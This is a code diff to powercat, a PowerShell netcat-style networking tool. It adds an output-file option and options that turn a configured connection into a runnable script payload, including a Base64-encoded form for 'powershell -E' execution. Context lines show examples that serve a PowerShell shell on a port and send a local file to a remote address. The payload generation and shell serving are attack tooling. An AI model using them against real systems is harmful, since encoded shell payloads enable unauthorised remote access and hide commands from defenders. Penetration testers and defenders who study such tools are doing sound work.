@@ -13,8 +13,11 @@ function powercat
     [alias("Timeout")][int32]$t=60,
     [Parameter(ValueFromPipeline=$True)][alias("Input")]$i=$null,
     [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",
+    [alias("OutputFile")][string]$of="",
     [alias("Disconnect")][switch]$d=$False,
     [alias("Repeater")][switch]$rep=$False,
+    [alias("GeneratePayload")][switch]$g=$False,
+    [alias("GenerateEncoded")][switch]$ge=$False,
     [alias("Help")][switch]$h=$False
   )
   
@@ -69,13 +72,21 @@ Usage: powercat [-c or -l] [-p port] [options]
             
   -o  <type>      Output. Specify how powercat should return information to the console.
                   Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.
-                  Use 'Bytes' for moving binaries and 'String' for moving text.
+            
+  -of <path>      Output File.  Specify the path to a file to write output to.
             
   -d              Disconnect. powercat will disconnect after the connection is established
                   and the input from -i is sent. Used for scanning.
             
   -rep            Repeater. powercat will continually restart after it is disconnected.
                   Used for setting up a persistent server.
+                  
+  -g              Generate Payload.  Returns a script as a string which will execute the
+                  powercat with the options you have specified. -i, -d, and -rep will not
+                  be incorporated.
+                  
+  -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
+                  can be executed in this way: powershell -E <encoded string>
 
   -h              Print this help message.
 
@@ -95,7 +106,7 @@ Examples:
       powercat -c 10.1.1.15 -p 8000 -i C:\inputfile
   
   Write the data sent to the local listener on port 4444 to C:\outfile
-      [io.file]::WriteAllBytes('C:\outfile',(powercat -l -p 4444 -o Bytes))
+      powercat -l -p 4444 -of C:\outfile
   
   Listen on port 8000 and repeatedly server a powershell shell.
       powercat -l -p 8000 -ep -rep
@@ -111,6 +122,7 @@ Examples:
   ############### HELP ###############
   
   ############### VALIDATE ARGS ###############
+  if($of -ne ''){$o = 'Bytes'}
   if($p -eq ""){return "Please provide a port number to -p."}
   if((($c -eq "") -and (!$l)) -or (($c -ne "") -and $l)){return "You must select either client mode (-c) or listen mode (-l)."}
   if(((($r -ne "") -and ($e -ne "")) -or (($e -ne "") -and ($ep))) -or  (($r -ne "") -and ($ep))){return "You can only pick one of these: -e, -ep, -r"}
@@ -798,17 +810,36 @@ Examples:
   $InvokeString = ($FunctionString + $InvokeString)
   ########## GENERATE PAYLOAD ##########
   
-  if($rep)
+  ########## RETURN GENERATED PAYLOADS ##########
+  if($ge){return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($InvokeString))}
+  elseif($g){return $InvokeString}
+  ########## RETURN GENERATED PAYLOADS ##########
+  
+  ########## EXECUTION ##########
+  $Output = $null
+  try
   {
-    while($True)
+    if($rep)
     {
-      IEX $InvokeString
-      Start-Sleep -s 2
-      Write-Verbose "Repetition Enabled: Restarting..."
+      while($True)
+      {
+        $Output += IEX $InvokeString
+        Start-Sleep -s 2
+        Write-Verbose "Repetition Enabled: Restarting..."
+      }
+    }
+    else
+    {
+      $Output += IEX $InvokeString
     }
   }
-  else
+  finally
   {
-    IEX $InvokeString
+    if($Output -ne $null)
+    {
+      if($of -eq ""){$Output}
+      else{[io.file]::WriteAllBytes($of,$Output)}
+    }
   }
+  ########## EXECUTION ##########
 }
